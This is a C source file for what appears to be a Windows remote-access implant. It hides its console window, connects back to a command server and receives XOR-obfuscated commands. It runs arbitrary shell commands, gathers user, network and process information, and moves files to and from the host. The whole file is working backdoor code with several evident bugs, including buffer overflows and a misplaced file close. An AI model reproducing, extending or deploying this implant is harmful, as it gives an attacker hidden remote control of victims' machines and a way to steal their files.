#define _WIN32_WINNT 0x0500

#include <stdio.h>
#include <windows.h>
//#include <sys/socket.h>
#include <winsock2.h>
#include <stdlib.h>
//#include <netinet/in.h>
#include <string.h>
//#include <arpa/inet.h>
#include <unistd.h>


#define PORT 35001
#define OS "windows"
#define KILL 1
#define PS 2
#define TASKLIST 3
#define IPCONFIG 4
#define OPERATING_SYSTEM 5
#define USER 6
#define IFCONFIG 7
#define OSCMDWINDOWS 8
#define OSCMDLINUX 9
#define PWDWINDOWS 10
#define PWDLINUX 11
#define DIRWINDOWS 12
#define DIRLINUX 13
#define RAW 14
#define DOWNLOAD 15
#define UPLOAD 16
#define CLEAR 17

SOCKET sock = 0;

char *xorE(char message[]){
    for(int i=0; i<strlen(message); i++)
	message[i] ^= '[';
    return message;
}

int parseData(char data[]){
    if(strstr(data,"kill") != NULL){
	    return KILL;
    }
    else if(strstr(data,"ps") != NULL){
	    if (OS=="linux"){
            return PS;
        }
        else if (OS=="windows"){
            return TASKLIST;
        }
    }
    else if(strstr(data,"ip") != NULL){
        if (OS=="linux"){
            return IFCONFIG;
        }
        else if (OS=="windows"){
            return IPCONFIG;
        }
    }
    else if(strstr(data,"os") != NULL){
        if (OS=="linux"){
            return OSCMDLINUX;
        }
        else if (OS=="windows"){
            return OSCMDWINDOWS;
        }
    }
    else if(strstr(data,"user") != NULL){
        return USER;
    }
    else if(strstr(data,"pwd") != NULL){
        if (OS=="linux"){
            return PWDLINUX;
        }
        else if (OS=="windows"){
            return PWDWINDOWS;
        }
    }
    else if(strstr(data,"dir") != NULL){
        if (OS=="linux"){
            return DIRLINUX;
        }
        else if (OS=="windows"){
            return DIRWINDOWS;
        }
    }
    else if (strstr(data, "download") != NULL){
        return DOWNLOAD;
    }
    else if (strstr(data, "upload") != NULL){
        return UPLOAD;
    }
    else if (strstr(data, "clearbuff") != NULL){
        return CLEAR;
    }
    else{
	    return RAW;
    }

}

void invoke_raw(char buf[], char data[]){
    FILE *fp;
    char tempBuffer[100] = {0};

    fp = popen(buf, "r");

    while(fgets(tempBuffer, 2048, fp)){
        strcat(data,tempBuffer);
    }

    pclose(fp);

    return;

}

void testMe(){
	int lies = 0;
	lies++;
	return;
}
void invoke_command(int cmd, char data[]){
    FILE *fp;
    char command[30];
    char tempBuffer[1024] = {0};

    switch(cmd){
        case PS:
            sprintf(command, "ps");
            break;
        case TASKLIST:
            sprintf(command, "tasklist");
            break;
        case IPCONFIG:
            sprintf(command, "ipconfig");
            break;
        case IFCONFIG:
            sprintf(command, "ifconfig -a");
            break;
        case OSCMDWINDOWS:
            sprintf(command, "ver");
            break;
        case OSCMDLINUX:
            sprintf(command, "uname -smro; cat /etc/os-release");
            break;
        case USER:
            sprintf(command, "whoami");
            break;
        case PWDWINDOWS:
            sprintf(command, "cd");
            break;
        case PWDLINUX:
            sprintf(command, "pwd");
            break;
        case DIRWINDOWS:
            sprintf(command, "dir");
            break;
        case DIRLINUX:
            sprintf(command, "ls -l");
            break;
        default:    
            return;
    }
    fp = popen(command, "r");

    while(fgets(tempBuffer, 1024, fp)){
        strcpy(data,tempBuffer);
		xorE(data);
		send(sock, data, strlen(data), 0);
    }
	strcpy(data, "EndeNdenD");
	xorE(data);
	send(sock, data, strlen(data), 0);

    pclose(fp);

    return;
}

/* Takes a buffer with a string such as: download /path/to/file
or upload /path/to/file and strips out everything but the filepath */
void filePathSplit(char buffer[], char data[]){
    char *token;
    char filePath[100];
    strcpy(filePath,buffer);

    /* Tokenize filePath and get first token */    
    token = strtok(filePath," ");

    /* Ensure we have a second token, which should be the path */
    if(token){
        token = strtok(NULL," ");
        strcpy(filePath,token);
    }else{
        return;
    }
    sprintf(data,"%s",filePath);
    return;
}
void uploadFile(int sock){
    char *p_char;
    char delim[] = "xxxxx";
    char tokenBuffer[1024];
    char dataBuffer[1024];
    int fileSize, bytesRead,overage,got = 0;
    char fileSizeBuf[1024];
    FILE *fp = fopen("output","w+b");

    
    
    /* Receive first 1024 of file and parse out file size */
    /* Bytes read has 12 subtracted to account for message header */
    recv(sock, fileSizeBuf, sizeof(fileSizeBuf), 0);

    xorE(fileSizeBuf);

    printf("file size string: %s\n",fileSizeBuf);
    fileSize = atoi(fileSizeBuf);
    printf("file size is: %d\n",fileSize);
    
    while (bytesRead < fileSize){
        got = recv(sock, tokenBuffer,1024,0);
        bytesRead += got;
        if (bytesRead > fileSize){
            printf("Changing overage!");
            overage = bytesRead - fileSize;
        }
        fileSize--;
        strncpy(dataBuffer,xorE(tokenBuffer),got-overage);
        //strcat(dataBuffer,"\0\0\0");
        fputs(dataBuffer,fp);
    fclose(fp);
    } 
}

/* Takes a char array of the full path to the file to send back
to the server */
void downloadFile(int sock, char filePath[]){
    FILE *fp;
    char filename[100];
    char buffer[1024];
    int fileSize;
    
    strcpy(filename, filePath);


    /* open file and get size*/
    fp = fopen(filename, "r");
    if (fp == NULL){
        return;
    }
    fseek(fp, 0L, SEEK_END);
    fileSize = ftell(fp);
    rewind(fp);
    printf("The size of the file is: %d\n",fileSize);

    /* Send file size */
	sprintf(buffer,"xxxxx%ixxxxx",fileSize);
    send(sock, xorE(buffer), strlen(buffer), 0);

    /* read contents */
    while(fgets(buffer, 1024, fp)){
        send(sock, xorE(buffer), strlen(buffer), 0);
    }
    printf("Done with sending file\n");
    
    /* Send end of file message */
    sprintf(buffer,"99999EOF99999");
    send(sock, xorE(buffer), strlen(buffer), 0);
    //shutdown(sock,SHUT_RDWR);
    close(sock);
    fclose(fp);
    return;
}

/* Connects to server, returns socket */
SOCKET connectToServer(){
	WSADATA wsa;
    SOCKET s;
    struct sockaddr_in address;
    struct sockaddr_in serv_addr;
 
    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
    {
        return 1;
    }
 
    memset(&serv_addr, '0', sizeof(serv_addr));
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);
    serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
 
    connect(sock, (struct sockaddr *)&serv_addr,sizeof(serv_addr));
    return sock;
}

int main(int argc, char const *argv[]){
	ShowWindow(GetConsoleWindow(), SW_HIDE);

    SOCKET sock = 0;
	int valread;
    char wakeUp[] = "Client Connected";
    char buffer[1024] = {0};
    char message[1024];
    sock = connectToServer();

    char data[1024];
    
    while(1){

	memset(buffer,0,sizeof(buffer));
	memset(data,0,sizeof(data));

	valread = recv(sock, buffer, 1024, 0);
	int cmd = parseData(xorE(buffer));
	switch(cmd){
        case RAW:
            invoke_raw(buffer,data);
            sprintf(message, "Returned %s result:\n%sEndeNdenD\n",buffer,data);
            xorE(message);
            send(sock, message, strlen(message), 0);
            break;
        case KILL:
            shutdown(sock, 2);
            send(sock, message, strlen(message), 0);
            return 0;
        case DOWNLOAD:
            //printf("buffer is: %s\n",buffer);
            filePathSplit(buffer,data);
            downloadFile(sock, data);
            //sprintf(message, "Sending file %s back to server\n",data);
            //printf("message is: %s\n",message);
            //message = xorE(message);
            sleep(1);
            sock = connectToServer();
            break;
		case UPLOAD:
            printf("Upload buffer is: %s\n", buffer);
            uploadFile(sock);
            sprintf(message, "Received File");
            xorE(message);
            send(sock, message, strlen(message), 0);
            break;
        case CLEAR:
            sprintf(message, "Returned %s result:\n%s\n",buffer,data);
            xorE(message);
            send(sock, message, strlen(message), 0);
            break;    
        default:
            invoke_command(cmd,data);
            //sprintf(message, "Returned %s result:\n%s\n",buffer,data);         
            break;
	}
    
    }
    return 0;
}
